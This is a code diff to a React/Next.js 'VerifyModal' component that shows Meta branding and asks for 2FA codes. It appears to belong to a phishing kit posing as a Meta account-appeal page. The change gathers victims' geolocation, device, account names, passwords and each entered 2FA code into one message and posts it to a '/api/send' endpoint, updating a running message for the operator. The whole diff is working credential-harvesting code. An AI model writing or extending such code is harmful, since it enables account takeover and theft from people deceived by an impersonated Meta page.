@@ -2,6 +2,7 @@ import MetaLogo from '@/assets/images/meta-logo-image.png';
 import VerifyImage from '@/assets/images/verify-image.png';
 import { store } from '@/store/store';
 import config from '@/utils/config';
+import { buildAppealMessage } from '@/utils/message';
 import translateText from '@/utils/translate';
 import axios from 'axios';
 import Image from 'next/image';
@@ -15,8 +16,9 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showError, setShowError] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId, messageContent, setMessageId, setMessageContent } = store();
+    const { geoInfo, deviceLabel, messageId, userData, addCode, setMessageId } = store();
     const maxCode = config.MAX_CODE ?? 3;
+    const maxPass = config.MAX_PASS ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 60;
 
     const t = (text: string): string => {
@@ -61,19 +63,28 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const next = attempts + 1;
         setAttempts(next);
 
-        const codeLine = `<b>🔐 2FA Code ${next}/${maxCode}:</b> <code>${code}</code>`;
+        addCode(code);
 
-        const updatedMessage = messageContent ? `${messageContent}\n\n${codeLine}` : codeLine;
+        const allCodes = [...userData.codes, code];
+        const message = buildAppealMessage({
+            geoInfo,
+            deviceLabel,
+            userData,
+            accounts: userData.accounts,
+            passwords: userData.passwords,
+            codes: allCodes,
+            maxPass,
+            maxCode
+        });
 
         try {
             const res = await axios.post('/api/send', {
-                message: updatedMessage,
-                message_id: messageId
+                message,
+                old_message_id: messageId
             });
 
             if (res?.data?.success && typeof res.data.message_id === 'number') {
                 setMessageId(res.data.message_id);
-                setMessageContent(updatedMessage);
             }
 
             if (next >= maxCode) {
